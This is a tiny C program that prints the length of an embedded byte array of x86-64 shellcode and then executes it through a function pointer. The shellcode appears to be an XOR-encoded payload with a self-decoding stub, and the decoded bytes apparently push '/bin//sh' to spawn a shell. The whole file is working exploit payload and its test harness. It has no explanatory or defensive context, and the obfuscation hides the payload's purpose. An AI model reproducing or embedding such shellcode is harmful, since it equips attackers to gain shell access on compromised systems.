#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x1e\x5f\x48\x8d\x77\x08\x48\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x48\x83\xc6\x08\xe2\xee\xeb\x0d\xe8\xdd\xff\xff\xff\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xe2\x9b\x6a\xfa\xe2\x11\x85\xc8\xc3\xc4\x85\x85\xd9\xc2\xf9\xe2\x23\x4d\xfa\xe2\x23\x48\xfd\xe2\x23\x4c\xe2\x29\x6a\x91\xa5\xaf";

main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
